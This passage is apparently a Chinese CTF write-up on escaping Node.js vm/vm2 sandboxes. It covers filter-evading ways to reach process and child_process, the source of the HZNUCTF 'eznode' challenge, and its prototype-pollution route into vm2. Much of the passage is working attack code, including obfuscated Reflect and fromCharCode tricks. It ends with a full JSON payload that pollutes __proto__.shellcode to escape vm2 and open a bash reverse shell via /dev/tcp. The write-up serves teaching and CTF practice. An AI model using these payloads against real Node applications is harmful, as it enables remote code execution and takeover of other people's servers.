<div class="highlight"><pre><span></span><span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">global</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'eva'</span><span class="p">)))</span>
</pre></div>
<p>这样就可以获得eval方法</p>
<p>第一步是要获得global这个模块，原来是获取process模块，但是如果获取到了global，那什么都好获取了</p>
<div class="highlight"><pre><span></span><span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(){</span>
            <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
            <span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">'return process'</span><span class="p">))();</span>
            <span class="p">}</span>
</pre></div>
<p>然后就要获取我们的process模块，并且引用child_process</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">p</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">p</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'pro'</span><span class="p">))).</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">99</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">115</span><span class="p">));</span>
<span class="mi">1</span>
<span class="nx">child_process</span>
<span class="kr">const</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">global</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">global</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'pro'</span><span class="p">)));</span>
<span class="kr">const</span> <span class="nx">b</span><span class="o">=</span><span class="nx">process</span><span class="p">.</span><span class="nx">mainModule</span><span class="p">.</span><span class="nx">require</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">99</span><span class="p">,</span><span class="mi">104</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">100</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">115</span><span class="p">));</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span><span class="c1">//获取到process</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span><span class="c1">//获取到child_process</span>
</pre></div>
<p>任何就是获取exec并执行命令</p>
<div class="highlight"><pre><span></span><span class="k">return</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">Reflect</span><span class="p">.</span><span class="nx">ownKeys</span><span class="p">(</span><span class="nx">a</span><span class="p">).</span><span class="nx">find</span><span class="p">(</span><span class="nx">x</span><span class="p">=&gt;</span><span class="nx">x</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">'ex'</span><span class="p">)))(</span><span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'"</span><span class="p">);</span>
</pre></div>
<p>获取a对象的exec这个对象去执行后面的命令</p>
<h4 data-content="1" id="ff0bf738992324418892f20f0d8470b9"><strong>HZNUCTF eznode</strong></h4>
<p>访问app.js获取源码</p>
<div class="highlight"><pre><span></span><span class="kr">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'express'</span><span class="p">);</span>
<span class="kr">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">();</span>
<span class="kr">const</span> <span class="p">{</span> <span class="nx">VM</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">'vm2'</span><span class="p">);</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">json</span><span class="p">());</span>

<span class="kr">const</span> <span class="nx">backdoor</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="k">new</span> <span class="nx">VM</span><span class="p">().</span><span class="nx">run</span><span class="p">({}.</span><span class="nx">shellcode</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kr">const</span> <span class="nx">isObject</span> <span class="o">=</span> <span class="nx">obj</span> <span class="p">=&gt;</span> <span class="nx">obj</span> <span class="o">&amp;&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">constructor</span> <span class="o">&amp;&amp;</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">constructor</span> <span class="o">===</span> <span class="nb">Object</span><span class="p">;</span>
<span class="kr">const</span> <span class="nx">merge</span> <span class="o">=</span> <span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">attr</span> <span class="k">in</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">isObject</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="nx">attr</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isObject</span><span class="p">(</span><span class="nx">b</span><span class="p">[</span><span class="nx">attr</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nx">merge</span><span class="p">(</span><span class="nx">a</span><span class="p">[</span><span class="nx">attr</span><span class="p">],</span> <span class="nx">b</span><span class="p">[</span><span class="nx">attr</span><span class="p">]);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nx">a</span><span class="p">[</span><span class="nx">attr</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">[</span><span class="nx">attr</span><span class="p">];</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">a</span>
<span class="p">}</span>
<span class="kr">const</span> <span class="nx">clone</span> <span class="o">=</span> <span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">merge</span><span class="p">({},</span> <span class="nx">a</span><span class="p">);</span>
<span class="p">}</span>


<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"POST some json shit to /.  no source code and try to find source code"</span><span class="p">);</span>
<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span>
        <span class="kd">var</span> <span class="nx">body</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">));</span>
        <span class="kd">var</span> <span class="nx">copybody</span> <span class="o">=</span> <span class="nx">clone</span><span class="p">(</span><span class="nx">body</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">copybody</span><span class="p">.</span><span class="nx">shit</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">backdoor</span><span class="p">()</span>
        <span class="p">}</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"post shit ok"</span><span class="p">)</span>
    <span class="p">}</span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
        <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">"is it shit ?"</span><span class="p">)</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">})</span>

<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">3000</span><span class="p">,</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">'start listening on port 3000'</span><span class="p">);</span>
<span class="p">});</span>
</pre></div>
<p>大概就是在页面post传递一个json数据，会经过<code>json.parse</code>函数解析，然后再通过<code>clone()</code>函数复制到<code>copybody</code>变量中，最后判断该变量的shit值是否为真，然后调用<code>backdoor()</code>函数在VM2沙箱中执行<code>{}.shellcode</code>属性。<code>clone()</code>函数很明显的一个<a href="https://so.csdn.net/so/search?q=原型链&amp;spm=1001.2101.3001.7020" target="_blank">原型链</a>污染，而<code>VM2</code>会执行<code>shellcode</code>属性的内容，那么也就是我们需要将该属性污染成<code>VM2</code>沙箱逃逸的<code>payload</code>即可执行任意命令</p>
<p>payload：</p>
<pre><code>{"shit":1,"__proto__":{"shellcode":"let res = import('./foo.js');res.toString.constructor(\"return this\")().process.mainModule.require(\"child_process\").execSync('bash -c \"bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1\"').toString();"}}</code></pre>
<p><strong>参考链接</strong></p>
<p><a href="https://blog.csdn.net/qq_61839115/article/details/132120985" target="_blank">NodeJS vm&amp;vm2沙箱逃逸_node vm2-CSDN博客</a></p>
<p><a href="https://www.anquanke.com/post/id/207291#h2-1" target="_blank">vm2沙箱逃逸分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
</div>
</div>